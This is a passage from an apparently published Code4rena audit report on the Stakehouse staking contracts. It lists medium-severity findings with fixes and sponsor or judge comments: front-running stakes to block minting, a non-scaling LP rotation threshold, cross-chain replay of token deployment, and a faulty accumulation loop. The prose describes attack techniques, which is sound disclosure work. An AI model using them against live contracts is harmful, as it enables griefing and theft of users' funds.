ETH. However, <code>Syndicate.stake</code> only allows a total staking amount of 12 ETH and reverts otherwise:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_sETHAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalStaked</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">12</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidStakeAmount</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>An attacker can abuse this and front-run calls to <code>mintDerivatives</code> (which call <code>_autoStakeWithSyndicate</code> internally). Because <code>Syndicate.stake</code> can be called by everyone, he can stake the minimum amount (1 gwei) such that the <code>mintDerivatives</code> call fails.</p>\n<h3 id=\"proof-of-concept-30\" style=\"position:relative;\"><a href=\"#proof-of-concept-30\" aria-label=\"proof of concept 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>As soon as there is a <code>mintDerivatives</code> call in the mempool, an attacker (that owns sETH) calls <code>Syndicate.stake</code> with an amount of 1 gwei. <code>_autoStakeWithSyndicate</code> will still call <code>Syndicate.stake</code> with 12 ether. However, <code>_sETHAmount + totalStaked > 12 ether</code> will then be true, meaning that the call will revert.</p>\n<h3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Only allow staking through the LiquidStakingManager, i.e. add access control to <code>Syndicate.stake</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/146#issuecomment-1329482113\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-13-giantpool-batchrotatelptokens-function-minimum-balance-for-rotating-lp-tokens-should-by-dynamically-calculated\" style=\"position:relative;\"><a href=\"#m-13-giantpool-batchrotatelptokens-function-minimum-balance-for-rotating-lp-tokens-should-by-dynamically-calculated\" aria-label=\"m 13 giantpool batchrotatelptokens function minimum balance for rotating lp tokens should by dynamically calculated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/149\">[M-13] GiantPool <code>batchRotateLPTokens</code> function: Minimum balance for rotating LP Tokens should by dynamically calculated</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/149\">aphak5010</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22</a></p>\n<p>The <code>GiantSavETHVaultPool</code> and <code>GiantMevAndFeesPool</code> both have a <code>batchRotateLPTokens</code> function that allows to move staked ETH to another key. Both functions require that the GiantLP balance of the sender is <code>>=0.5 ether</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116</a></p>\n<p>The reason for this is that there is a <code>common interest</code> needed in order to rotate LP Tokens. The way this is implemented right now does not serve this purpose and even makes the functions unable to be called in some cases.</p>\n<p>The <code>MIN_STAKING_AMOUNT</code> for the GiantPools is <code>0.001 ether</code> (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22</a>). So a user should expect that this amount is sufficient to properly use the contract. However, even if there are multiple users paying into the GiantPool, they might not reach the 0.5 ETH threshold to call the function. So even if they would use some kind of multisig wallet to call the <code>batchRotateLPTokens</code> function, it would not be possible.</p>\n<p>Also the threshold does not scale.</p>\n<p>Imagine that User A puts 100 ETH into the GiantPool. Another User B puts 0.5 ETH into the GiantPool. Can we speak of “common interest” when User B wants to rotate the LP Tokens?</p>\n<h3 id=\"tools-used-21\" style=\"position:relative;\"><a href=\"#tools-used-21\" aria-label=\"tools used 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-33\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-33\" aria-label=\"recommended mitigation steps 33 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>My suggestion is to use a formula like:<br>\n<code>require(lpTokenETH.balanceOf(msg.sender) >= (lpTokenETH.totalSupply() / CONSTANT_VALUE))</code>.<br>\nWhere you can choose a CONSTANT_VALUE like 20 or 50.</p>\n<p>This properly scales the required amount and helps mitigate both scenarios.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/149#issuecomment-1329480261\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-14-cross-chain-replay-attacks-are-possible-with-deploylptoken\" style=\"position:relative;\"><a href=\"#m-14-cross-chain-replay-attacks-are-possible-with-deploylptoken\" aria-label=\"m 14 cross chain replay attacks are possible with deploylptoken permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/154\">[M-14] Cross-chain replay attacks are possible with <code>deployLPToken</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/154\">0xSmartContract</a></em></p>\n<p>Mistakes made on one chain can be re-applied to a new chain. There is no chain.id in the data.</p>\n<p>If a user does <code>deployLPToken</code> using the wrong network, an attacker can replay the action on the correct chain, and steal the funds a-la the wintermute gnosis safe attack, where the attacker can create the same address that the user tried to, and steal the funds from there</p>\n<p><a href=\"https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY\">https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY</a></p>\n<h3 id=\"proof-of-concept-31\" style=\"position:relative;\"><a href=\"#proof-of-concept-31\" aria-label=\"proof of concept 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPTokenFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">26</span><span class=\"mtk1\">      </span><span class=\"mtk3\">/// @param _tokenName Name of the LP token to be deployed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">27</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployLPToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  28:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_deployer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  29:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_transferHookProcessor</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  30:         </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_tokenSymbol</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  31:         </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_tokenName</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">32</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">33</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_deployer</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">34</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenSymbol</span><span class=\"mtk1\">).</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Symbol cannot be zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">35</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenName</span><span class=\"mtk1\">).</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Name cannot be zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">36</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">37</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newInstance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Clones</span><span class=\"mtk1\">.</span><span class=\"mtk11\">clone</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpTokenImplementation</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">38</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">ILPTokenInit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newInstance</span><span class=\"mtk1\">).</span><span class=\"mtk11\">init</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">39</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_deployer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">40</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_transferHookProcessor</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">41</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_tokenSymbol</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">42</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_tokenName</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">43</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">44</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">45</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LPTokenDeployed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newInstance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">46</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">47</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newInstance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">48</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-34\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-34\" aria-label=\"recommended mitigation steps 34 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Include the chain.id</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/154#issuecomment-1329479473\">vince0656 (Stakehouse) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>LSD is a protocol deployed on ETH only.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/154#issuecomment-1332212179\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Understood, but ETH can and has forked. It is also possible that you or a team that succeeds you changes your mind about multiple network deployments.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-15-giantmevandfeespoolpreviewaccumulatedeth-function-accumulated-variable-is-not-updated-correctly-in-for-loop-leading-to-result-that-is-too-low\" style=\"position:relative;\"><a href=\"#m-15-giantmevandfeespoolpreviewaccumulatedeth-function-accumulated-variable-is-not-updated-correctly-in-for-loop-leading-to-result-that-is-too-low\" aria-label=\"m 15 giantmevandfeespoolpreviewaccumulatedeth function accumulated variable is not updated correctly in for loop leading to result that is too low permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/160\">[M-15] <code>GiantMevAndFeesPool.previewAccumulatedETH</code> function: “accumulated” variable is not updated correctly in for loop leading to result that is too low</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/160\">aphak5010</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/447\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/417\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/346\">Aymen0909</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/320\">zaskoh</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91</a></p>\n<p>The <code>GiantMevAndFeesPool.previewAccumulatedETH</code> function (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82</a>) allows to view the ETH that is accumulated by an address.</p>\n<p>However the formula is not correct.</p>\n<p>In each iteration of the foor loop, <code>accumulated</code> is assigned a new value (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91</a>) when actually the value should be updated like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">accumulated</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">StakingFundsVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stakingFundsVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">])).</span><span class=\"mtk11\">batchPreviewAccumulatedETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_lpTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span></code></pre>\n<p>Obviously the <code>accumulated</code> value must be calculated for all stakingFundVaults not only for one stakingFundsVault.</p>\n<p>While this calculation is not used internally by the contract, it will cause any third-party contract that relies on this calculation to behave incorrectly.</p>\n<p>For example a third party smart contract might only allow users to withdraw once the value returned by <code>previewAccumulatedETH</code> reaches a certain threshold. Because of the issue however the accumulated ETH value that is returned will always be too low.</p>\n<h3 id=\"tools-used-22\" style=\"position:relative;\"><a href=\"#tools-used-22\" aria-label=\"tools used 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-35\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-35\" aria-label=\"recommended mitigation steps 35 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">88</span><span class=\"mtk1\">,</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">88</span><span class=\"mtk1\">,</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> @@ </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GiantMevAndFeesPool</span><span class=\"mtk1\"> </span><span 